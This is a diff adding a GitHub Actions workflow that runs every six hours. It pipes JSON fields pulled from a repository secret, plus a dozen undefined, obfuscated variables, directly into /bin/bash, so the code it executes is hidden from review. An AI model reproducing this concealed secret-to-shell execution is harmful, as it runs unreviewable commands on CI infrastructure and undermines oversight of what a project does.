@@ -1,0 +1,31 @@
+name: zhaolintongli
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaolintongli
+        env:
+          s0624: ${{ secrets.s0624 }}
+        run: |
+          echo $s0624 | jq -r .qcz7 | /bin/bash
+          echo $mp53562 | jq -r .yv24650 | /bin/bash
+          echo $fnqx010 | jq -r .dzxw2883 | /bin/bash
+          echo $kt21825 | jq -r .qijn9 | /bin/bash
+          echo $greke71 | jq -r .p1 | /bin/bash
+          echo $wv4798 | jq -r .lnnw91 | /bin/bash
+          echo $qk187 | jq -r .wy35261 | /bin/bash
+          echo $lqyj85481 | jq -r .s91862 | /bin/bash
+          echo $xmxx916 | jq -r .is0294 | /bin/bash
+          echo $hb89 | jq -r .o151 | /bin/bash
+          echo $fpza49 | jq -r .cijfl63 | /bin/bash
+          echo $axp3 | jq -r .qjai194 | /bin/bash
+          echo $lu78089 | jq -r .rao3 | /bin/bash
+
